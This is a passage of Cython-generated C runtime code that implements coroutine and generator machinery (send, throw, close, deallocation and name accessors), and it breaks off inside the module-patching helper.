static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* CoroutineBase */
#include <frameobject.h>
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#define __Pyx_Coroutine_Undelegate(gen) Py_CLEAR((gen)->yieldfrom)
static int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *__pyx_tstate, PyObject **pvalue) {
    PyObject *et, *ev, *tb;
    PyObject *value = NULL;
    CYTHON_UNUSED_VAR(__pyx_tstate);
    __Pyx_ErrFetch(&et, &ev, &tb);
    if (!et) {
        Py_XDECREF(tb);
        Py_XDECREF(ev);
        Py_INCREF(Py_None);
        *pvalue = Py_None;
        return 0;
    }
    if (likely(et == PyExc_StopIteration)) {
        if (!ev) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#if PY_VERSION_HEX >= 0x030300A0
        else if (likely(__Pyx_IS_TYPE(ev, (PyTypeObject*)PyExc_StopIteration))) {
            value = ((PyStopIterationObject *)ev)->value;
            Py_INCREF(value);
            Py_DECREF(ev);
        }
#endif
        else if (unlikely(PyTuple_Check(ev))) {
            if (PyTuple_GET_SIZE(ev) >= 1) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                value = PyTuple_GET_ITEM(ev, 0);
                Py_INCREF(value);
#else
                value = PySequence_ITEM(ev, 0);
#endif
            } else {
                Py_INCREF(Py_None);
                value = Py_None;
            }
            Py_DECREF(ev);
        }
        else if (!__Pyx_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration)) {
            value = ev;
        }
        if (likely(value)) {
            Py_XDECREF(tb);
            Py_DECREF(et);
            *pvalue = value;
            return 0;
        }
    } else if (!__Pyx_PyErr_GivenExceptionMatches(et, PyExc_StopIteration)) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    PyErr_NormalizeException(&et, &ev, &tb);
    if (unlikely(!PyObject_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration))) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    Py_XDECREF(tb);
    Py_DECREF(et);
#if PY_VERSION_HEX >= 0x030300A0
    value = ((PyStopIterationObject *)ev)->value;
    Py_INCREF(value);
    Py_DECREF(ev);
#else
    {
        PyObject* args = __Pyx_PyObject_GetAttrStr(ev, __pyx_n_s_args);
        Py_DECREF(ev);
        if (likely(args)) {
            value = PySequence_GetItem(args, 0);
            Py_DECREF(args);
        }
        if (unlikely(!value)) {
            __Pyx_ErrRestore(NULL, NULL, NULL);
            Py_INCREF(Py_None);
            value = Py_None;
        }
    }
#endif
    *pvalue = value;
    return 0;
}
static CYTHON_INLINE
void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *exc_state) {
#if PY_VERSION_HEX >= 0x030B00a4
    Py_CLEAR(exc_state->exc_value);
#else
    PyObject *t, *v, *tb;
    t = exc_state->exc_type;
    v = exc_state->exc_value;
    tb = exc_state->exc_traceback;
    exc_state->exc_type = NULL;
    exc_state->exc_value = NULL;
    exc_state->exc_traceback = NULL;
    Py_XDECREF(t);
    Py_XDECREF(v);
    Py_XDECREF(tb);
#endif
}
#define __Pyx_Coroutine_AlreadyRunningError(gen)  (__Pyx__Coroutine_AlreadyRunningError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyRunningError(__pyx_CoroutineObject *gen) {
    const char *msg;
    CYTHON_MAYBE_UNUSED_VAR(gen);
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check((PyObject*)gen)) {
        msg = "coroutine already executing";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact((PyObject*)gen)) {
        msg = "async generator already executing";
    #endif
    } else {
        msg = "generator already executing";
    }
    PyErr_SetString(PyExc_ValueError, msg);
}
#define __Pyx_Coroutine_NotStartedError(gen)  (__Pyx__Coroutine_NotStartedError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_NotStartedError(PyObject *gen) {
    const char *msg;
    CYTHON_MAYBE_UNUSED_VAR(gen);
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check(gen)) {
        msg = "can't send non-None value to a just-started coroutine";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact(gen)) {
        msg = "can't send non-None value to a just-started async generator";
    #endif
    } else {
        msg = "can't send non-None value to a just-started generator";
    }
    PyErr_SetString(PyExc_TypeError, msg);
}
#define __Pyx_Coroutine_AlreadyTerminatedError(gen, value, closing)  (__Pyx__Coroutine_AlreadyTerminatedError(gen, value, closing), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyTerminatedError(PyObject *gen, PyObject *value, int closing) {
    CYTHON_MAYBE_UNUSED_VAR(gen);
    CYTHON_MAYBE_UNUSED_VAR(closing);
    #ifdef __Pyx_Coroutine_USED
    if (!closing && __Pyx_Coroutine_Check(gen)) {
        PyErr_SetString(PyExc_RuntimeError, "cannot reuse already awaited coroutine");
    } else
    #endif
    if (value) {
        #ifdef __Pyx_AsyncGen_USED
        if (__Pyx_AsyncGen_CheckExact(gen))
            PyErr_SetNone(__Pyx_PyExc_StopAsyncIteration);
        else
        #endif
        PyErr_SetNone(PyExc_StopIteration);
    }
}
static
PyObject *__Pyx_Coroutine_SendEx(__pyx_CoroutineObject *self, PyObject *value, int closing) {
    __Pyx_PyThreadState_declare
    PyThreadState *tstate;
    __Pyx_ExcInfoStruct *exc_state;
    PyObject *retval;
    assert(!self->is_running);
    if (unlikely(self->resume_label == 0)) {
        if (unlikely(value && value != Py_None)) {
            return __Pyx_Coroutine_NotStartedError((PyObject*)self);
        }
    }
    if (unlikely(self->resume_label == -1)) {
        return __Pyx_Coroutine_AlreadyTerminatedError((PyObject*)self, value, closing);
    }
#if CYTHON_FAST_THREAD_STATE
    __Pyx_PyThreadState_assign
    tstate = __pyx_tstate;
#else
    tstate = __Pyx_PyThreadState_Current;
#endif
    exc_state = &self->gi_exc_state;
    if (exc_state->exc_value) {
        #if CYTHON_COMPILING_IN_PYPY
        #else
        PyObject *exc_tb;
        #if PY_VERSION_HEX >= 0x030B00a4 && !CYTHON_COMPILING_IN_CPYTHON
        exc_tb = PyException_GetTraceback(exc_state->exc_value);
        #elif PY_VERSION_HEX >= 0x030B00a4
        exc_tb = ((PyBaseExceptionObject*) exc_state->exc_value)->traceback;
        #else
        exc_tb = exc_state->exc_traceback;
        #endif
        if (exc_tb) {
            PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
            PyFrameObject *f = tb->tb_frame;
            assert(f->f_back == NULL);
            #if PY_VERSION_HEX >= 0x030B00A1
            f->f_back = PyThreadState_GetFrame(tstate);
            #else
            Py_XINCREF(tstate->frame);
            f->f_back = tstate->frame;
            #endif
            #if PY_VERSION_HEX >= 0x030B00a4 && !CYTHON_COMPILING_IN_CPYTHON
            Py_DECREF(exc_tb);
            #endif
        }
        #endif
    }
#if CYTHON_USE_EXC_INFO_STACK
    exc_state->previous_item = tstate->exc_info;
    tstate->exc_info = exc_state;
#else
    if (exc_state->exc_type) {
        __Pyx_ExceptionSwap(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    } else {
        __Pyx_Coroutine_ExceptionClear(exc_state);
        __Pyx_ExceptionSave(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    }
#endif
    self->is_running = 1;
    retval = self->body(self, tstate, value);
    self->is_running = 0;
#if CYTHON_USE_EXC_INFO_STACK
    exc_state = &self->gi_exc_state;
    tstate->exc_info = exc_state->previous_item;
    exc_state->previous_item = NULL;
    __Pyx_Coroutine_ResetFrameBackpointer(exc_state);
#endif
    return retval;
}
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state) {
#if CYTHON_COMPILING_IN_PYPY
    CYTHON_UNUSED_VAR(exc_state);
#else
    PyObject *exc_tb;
    #if PY_VERSION_HEX >= 0x030B00a4
    if (!exc_state->exc_value) return;
    exc_tb = PyException_GetTraceback(exc_state->exc_value);
    #else
    exc_tb = exc_state->exc_traceback;
    #endif
    if (likely(exc_tb)) {
        PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
        PyFrameObject *f = tb->tb_frame;
        Py_CLEAR(f->f_back);
        #if PY_VERSION_HEX >= 0x030B00a4
        Py_DECREF(exc_tb);
        #endif
    }
#endif
}
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_MethodReturn(PyObject* gen, PyObject *retval) {
    CYTHON_MAYBE_UNUSED_VAR(gen);
    if (unlikely(!retval)) {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        if (!__Pyx_PyErr_Occurred()) {
            PyObject *exc = PyExc_StopIteration;
            #ifdef __Pyx_AsyncGen_USED
            if (__Pyx_AsyncGen_CheckExact(gen))
                exc = __Pyx_PyExc_StopAsyncIteration;
            #endif
            __Pyx_PyErr_SetNone(exc);
        }
    }
    return retval;
}
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
static CYTHON_INLINE
PyObject *__Pyx_PyGen_Send(PyGenObject *gen, PyObject *arg) {
#if PY_VERSION_HEX <= 0x030A00A1
    return _PyGen_Send(gen, arg);
#else
    PyObject *result;
    if (PyIter_Send((PyObject*)gen, arg ? arg : Py_None, &result) == PYGEN_RETURN) {
        if (PyAsyncGen_CheckExact(gen)) {
            assert(result == Py_None);
            PyErr_SetNone(PyExc_StopAsyncIteration);
        }
        else if (result == Py_None) {
            PyErr_SetNone(PyExc_StopIteration);
        }
        else {
            _PyGen_SetStopIterationValue(result);
        }
        Py_CLEAR(result);
    }
    return result;
#endif
}
#endif
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_FinishDelegation(__pyx_CoroutineObject *gen) {
    PyObject *ret;
    PyObject *val = NULL;
    __Pyx_Coroutine_Undelegate(gen);
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, &val);
    ret = __Pyx_Coroutine_SendEx(gen, val, 0);
    Py_XDECREF(val);
    return ret;
}
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value) {
    PyObject *retval;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_AsyncGen_USED
        if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
            ret = __Pyx_async_gen_asend_send(yf, value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03050000 && defined(PyCoro_CheckExact) && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyCoro_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        {
            if (value == Py_None)
                ret = __Pyx_PyObject_GetIterNextFunc(yf)(yf);
            else
                ret = __Pyx_PyObject_CallMethod1(yf, __pyx_n_s_send, value);
        }
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        retval = __Pyx_Coroutine_FinishDelegation(gen);
    } else {
        retval = __Pyx_Coroutine_SendEx(gen, value, 0);
    }
    return __Pyx_Coroutine_MethodReturn(self, retval);
}
static int __Pyx_Coroutine_CloseIter(__pyx_CoroutineObject *gen, PyObject *yf) {
    PyObject *retval = NULL;
    int err = 0;
    #ifdef __Pyx_Generator_USED
    if (__Pyx_Generator_CheckExact(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_Coroutine_USED
    if (__Pyx_Coroutine_Check(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    if (__Pyx_CoroutineAwait_CheckExact(yf)) {
        retval = __Pyx_CoroutineAwait_Close((__pyx_CoroutineAwaitObject*)yf, NULL);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_AsyncGen_USED
    if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
        retval = __Pyx_async_gen_asend_close(yf, NULL);
    } else
    if (__pyx_PyAsyncGenAThrow_CheckExact(yf)) {
        retval = __Pyx_async_gen_athrow_close(yf, NULL);
    } else
    #endif
    {
        PyObject *meth;
        gen->is_running = 1;
        meth = __Pyx_PyObject_GetAttrStrNoError(yf, __pyx_n_s_close);
        if (unlikely(!meth)) {
            if (unlikely(PyErr_Occurred())) {
                PyErr_WriteUnraisable(yf);
            }
        } else {
            retval = __Pyx_PyObject_CallNoArg(meth);
            Py_DECREF(meth);
            if (unlikely(!retval))
                err = -1;
        }
        gen->is_running = 0;
    }
    Py_XDECREF(retval);
    return err;
}
static PyObject *__Pyx_Generator_Next(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Generator_Next(yf);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, NULL);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, Py_None);
        } else
        #endif
            ret = __Pyx_PyObject_GetIterNextFunc(yf)(yf);
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        return __Pyx_Coroutine_FinishDelegation(gen);
    }
    return __Pyx_Coroutine_SendEx(gen, Py_None, 0);
}
static PyObject *__Pyx_Coroutine_Close_Method(PyObject *self, PyObject *arg) {
    CYTHON_UNUSED_VAR(arg);
    return __Pyx_Coroutine_Close(self);
}
static PyObject *__Pyx_Coroutine_Close(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *retval, *raised_exception;
    PyObject *yf = gen->yieldfrom;
    int err = 0;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        Py_INCREF(yf);
        err = __Pyx_Coroutine_CloseIter(gen, yf);
        __Pyx_Coroutine_Undelegate(gen);
        Py_DECREF(yf);
    }
    if (err == 0)
        PyErr_SetNone(PyExc_GeneratorExit);
    retval = __Pyx_Coroutine_SendEx(gen, NULL, 1);
    if (unlikely(retval)) {
        const char *msg;
        Py_DECREF(retval);
        if ((0)) {
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_Coroutine_Check(self)) {
            msg = "coroutine ignored GeneratorExit";
        #endif
        #ifdef __Pyx_AsyncGen_USED
        } else if (__Pyx_AsyncGen_CheckExact(self)) {
#if PY_VERSION_HEX < 0x03060000
            msg = "async generator ignored GeneratorExit - might require Python 3.6+ finalisation (PEP 525)";
#else
            msg = "async generator ignored GeneratorExit";
#endif
        #endif
        } else {
            msg = "generator ignored GeneratorExit";
        }
        PyErr_SetString(PyExc_RuntimeError, msg);
        return NULL;
    }
    raised_exception = PyErr_Occurred();
    if (likely(!raised_exception || __Pyx_PyErr_GivenExceptionMatches2(raised_exception, PyExc_GeneratorExit, PyExc_StopIteration))) {
        if (raised_exception) PyErr_Clear();
        Py_INCREF(Py_None);
        return Py_None;
    }
    return NULL;
}
static PyObject *__Pyx__Coroutine_Throw(PyObject *self, PyObject *typ, PyObject *val, PyObject *tb,
                                        PyObject *args, int close_on_genexit) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        Py_INCREF(yf);
        if (__Pyx_PyErr_GivenExceptionMatches(typ, PyExc_GeneratorExit) && close_on_genexit) {
            int err = __Pyx_Coroutine_CloseIter(gen, yf);
            Py_DECREF(yf);
            __Pyx_Coroutine_Undelegate(gen);
            if (err < 0)
                return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
            goto throw_here;
        }
        gen->is_running = 1;
        if (0
        #ifdef __Pyx_Generator_USED
            || __Pyx_Generator_CheckExact(yf)
        #endif
        #ifdef __Pyx_Coroutine_USED
            || __Pyx_Coroutine_Check(yf)
        #endif
            ) {
            ret = __Pyx__Coroutine_Throw(yf, typ, val, tb, args, close_on_genexit);
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_CoroutineAwait_CheckExact(yf)) {
            ret = __Pyx__Coroutine_Throw(((__pyx_CoroutineAwaitObject*)yf)->coroutine, typ, val, tb, args, close_on_genexit);
        #endif
        } else {
            PyObject *meth = __Pyx_PyObject_GetAttrStrNoError(yf, __pyx_n_s_throw);
            if (unlikely(!meth)) {
                Py_DECREF(yf);
                if (unlikely(PyErr_Occurred())) {
                    gen->is_running = 0;
                    return NULL;
                }
                __Pyx_Coroutine_Undelegate(gen);
                gen->is_running = 0;
                goto throw_here;
            }
            if (likely(args)) {
                ret = __Pyx_PyObject_Call(meth, args, NULL);
            } else {
                PyObject *cargs[4] = {NULL, typ, val, tb};
                ret = __Pyx_PyObject_FastCall(meth, cargs+1, 3 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);
            }
            Py_DECREF(meth);
        }
        gen->is_running = 0;
        Py_DECREF(yf);
        if (!ret) {
            ret = __Pyx_Coroutine_FinishDelegation(gen);
        }
        return __Pyx_Coroutine_MethodReturn(self, ret);
    }
throw_here:
    __Pyx_Raise(typ, val, tb, NULL);
    return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
}
static PyObject *__Pyx_Coroutine_Throw(PyObject *self, PyObject *args) {
    PyObject *typ;
    PyObject *val = NULL;
    PyObject *tb = NULL;
    if (unlikely(!PyArg_UnpackTuple(args, (char *)"throw", 1, 3, &typ, &val, &tb)))
        return NULL;
    return __Pyx__Coroutine_Throw(self, typ, val, tb, args, 1);
}
static CYTHON_INLINE int __Pyx_Coroutine_traverse_excstate(__Pyx_ExcInfoStruct *exc_state, visitproc visit, void *arg) {
#if PY_VERSION_HEX >= 0x030B00a4
    Py_VISIT(exc_state->exc_value);
#else
    Py_VISIT(exc_state->exc_type);
    Py_VISIT(exc_state->exc_value);
    Py_VISIT(exc_state->exc_traceback);
#endif
    return 0;
}
static int __Pyx_Coroutine_traverse(__pyx_CoroutineObject *gen, visitproc visit, void *arg) {
    Py_VISIT(gen->closure);
    Py_VISIT(gen->classobj);
    Py_VISIT(gen->yieldfrom);
    return __Pyx_Coroutine_traverse_excstate(&gen->gi_exc_state, visit, arg);
}
static int __Pyx_Coroutine_clear(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    Py_CLEAR(gen->closure);
    Py_CLEAR(gen->classobj);
    Py_CLEAR(gen->yieldfrom);
    __Pyx_Coroutine_ExceptionClear(&gen->gi_exc_state);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        Py_CLEAR(((__pyx_PyAsyncGenObject*)gen)->ag_finalizer);
    }
#endif
    Py_CLEAR(gen->gi_code);
    Py_CLEAR(gen->gi_frame);
    Py_CLEAR(gen->gi_name);
    Py_CLEAR(gen->gi_qualname);
    Py_CLEAR(gen->gi_modulename);
    return 0;
}
static void __Pyx_Coroutine_dealloc(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject_GC_UnTrack(gen);
    if (gen->gi_weakreflist != NULL)
        PyObject_ClearWeakRefs(self);
    if (gen->resume_label >= 0) {
        PyObject_GC_Track(self);
#if PY_VERSION_HEX >= 0x030400a1 && CYTHON_USE_TP_FINALIZE
        if (unlikely(PyObject_CallFinalizerFromDealloc(self)))
#else
        Py_TYPE(gen)->tp_del(self);
        if (unlikely(Py_REFCNT(self) > 0))
#endif
        {
            return;
        }
        PyObject_GC_UnTrack(self);
    }
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        /* We have to handle this case for asynchronous generators
           right here, because this code has to be between UNTRACK
           and GC_Del. */
        Py_CLEAR(((__pyx_PyAsyncGenObject*)self)->ag_finalizer);
    }
#endif
    __Pyx_Coroutine_clear(self);
    __Pyx_PyHeapTypeObject_GC_Del(gen);
}
static void __Pyx_Coroutine_del(PyObject *self) {
    PyObject *error_type, *error_value, *error_traceback;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    __Pyx_PyThreadState_declare
    if (gen->resume_label < 0) {
        return;
    }
#if !CYTHON_USE_TP_FINALIZE
    assert(self->ob_refcnt == 0);
    __Pyx_SET_REFCNT(self, 1);
#endif
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&error_type, &error_value, &error_traceback);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        __pyx_PyAsyncGenObject *agen = (__pyx_PyAsyncGenObject*)self;
        PyObject *finalizer = agen->ag_finalizer;
        if (finalizer && !agen->ag_closed) {
            PyObject *res = __Pyx_PyObject_CallOneArg(finalizer, self);
            if (unlikely(!res)) {
                PyErr_WriteUnraisable(self);
            } else {
                Py_DECREF(res);
            }
            __Pyx_ErrRestore(error_type, error_value, error_traceback);
            return;
        }
    }
#endif
    if (unlikely(gen->resume_label == 0 && !error_value)) {
#ifdef __Pyx_Coroutine_USED
#ifdef __Pyx_Generator_USED
    if (!__Pyx_Generator_CheckExact(self))
#endif
        {
        PyObject_GC_UnTrack(self);
#if PY_MAJOR_VERSION >= 3  || defined(PyErr_WarnFormat)
        if (unlikely(PyErr_WarnFormat(PyExc_RuntimeWarning, 1, "coroutine '%.50S' was never awaited", gen->gi_qualname) < 0))
            PyErr_WriteUnraisable(self);
#else
        {PyObject *msg;
        char *cmsg;
        #if CYTHON_COMPILING_IN_PYPY
        msg = NULL;
        cmsg = (char*) "coroutine was never awaited";
        #else
        char *cname;
        PyObject *qualname;
        qualname = gen->gi_qualname;
        cname = PyString_AS_STRING(qualname);
        msg = PyString_FromFormat("coroutine '%.50s' was never awaited", cname);
        if (unlikely(!msg)) {
            PyErr_Clear();
            cmsg = (char*) "coroutine was never awaited";
        } else {
            cmsg = PyString_AS_STRING(msg);
        }
        #endif
        if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, cmsg, 1) < 0))
            PyErr_WriteUnraisable(self);
        Py_XDECREF(msg);}
#endif
        PyObject_GC_Track(self);
        }
#endif
    } else {
        PyObject *res = __Pyx_Coroutine_Close(self);
        if (unlikely(!res)) {
            if (PyErr_Occurred())
                PyErr_WriteUnraisable(self);
        } else {
            Py_DECREF(res);
        }
    }
    __Pyx_ErrRestore(error_type, error_value, error_traceback);
#if !CYTHON_USE_TP_FINALIZE
    assert(Py_REFCNT(self) > 0);
    if (likely(--self->ob_refcnt == 0)) {
        return;
    }
    {
        Py_ssize_t refcnt = Py_REFCNT(self);
        _Py_NewReference(self);
        __Pyx_SET_REFCNT(self, refcnt);
    }
#if CYTHON_COMPILING_IN_CPYTHON
    assert(PyType_IS_GC(Py_TYPE(self)) &&
           _Py_AS_GC(self)->gc.gc_refs != _PyGC_REFS_UNTRACKED);
    _Py_DEC_REFTOTAL;
#endif
#ifdef COUNT_ALLOCS
    --Py_TYPE(self)->tp_frees;
    --Py_TYPE(self)->tp_allocs;
#endif
#endif
}
static PyObject *
__Pyx_Coroutine_get_name(__pyx_CoroutineObject *self, void *context)
{
    PyObject *name = self->gi_name;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_name(__pyx_CoroutineObject *self, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(self->gi_name, value);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_qualname(__pyx_CoroutineObject *self, void *context)
{
    PyObject *name = self->gi_qualname;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_qualname(__pyx_CoroutineObject *self, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(self->gi_qualname, value);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_frame(__pyx_CoroutineObject *self, void *context)
{
    PyObject *frame = self->gi_frame;
    CYTHON_UNUSED_VAR(context);
    if (!frame) {
        if (unlikely(!self->gi_code)) {
            Py_RETURN_NONE;
        }
        frame = (PyObject *) PyFrame_New(
            PyThreadState_Get(),            /*PyThreadState *tstate,*/
            (PyCodeObject*) self->gi_code,  /*PyCodeObject *code,*/
            __pyx_d,                 /*PyObject *globals,*/
            0                               /*PyObject *locals*/
        );
        if (unlikely(!frame))
            return NULL;
        self->gi_frame = frame;
    }
    Py_INCREF(frame);
    return frame;
}
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
            PyTypeObject* type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    __pyx_CoroutineObject *gen = PyObject_GC_New(__pyx_CoroutineObject, type);
    if (unlikely(!gen))
        return NULL;
    return __Pyx__Coroutine_NewInit(gen, body, code, closure, name, qualname, module_name);
}
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    gen->body = body;
    gen->closure = closure;
    Py_XINCREF(closure);
    gen->is_running = 0;
    gen->resume_label = 0;
    gen->classobj = NULL;
    gen->yieldfrom = NULL;
    #if PY_VERSION_HEX >= 0x030B00a4
    gen->gi_exc_state.exc_value = NULL;
    #else
    gen->gi_exc_state.exc_type = NULL;
    gen->gi_exc_state.exc_value = NULL;
    gen->gi_exc_state.exc_traceback = NULL;
    #endif
#if CYTHON_USE_EXC_INFO_STACK
    gen->gi_exc_state.previous_item = NULL;
#endif
    gen->gi_weakreflist = NULL;
    Py_XINCREF(qualname);
    gen->gi_qualname = qualname;
    Py_XINCREF(name);
    gen->gi_name = name;
    Py_XINCREF(module_name);
    gen->gi_modulename = module_name;
    Py_XINCREF(code);
    gen->gi_code = code;
    gen->gi_frame = NULL;
    PyObject_GC_Track(gen);
    return gen;
}

/* PatchModuleWithCoroutine */
static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    int result;
    PyObject *globals, *result_obj;
    globals = PyDict_New();  if (unlikely(!globals)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_coroutine_type",
    #ifdef __Pyx_Coroutine_USED
        (PyObject*)__pyx_CoroutineType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_generator_type",
    #ifdef __Pyx_Generator_USED
        (PyObject*)__pyx_GeneratorType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "_module", module) < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "__builtins__", __pyx_b) < 0)) goto ignore;
    result_obj = PyRun_String(py_code, Py_file_input, globals, globals);
    if (unlikely(!result_obj)) goto ignore;
    Py_DECREF(result_obj);
    Py_DECREF(globals);
    return module;
ignore:
    Py_XDECREF(globals);
    PyErr_WriteUnraisable(module);
    if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, "Cython module failed to patch module with custom type", 1) < 0)) {
        Py_DECREF(module);
        module = NULL;
    }
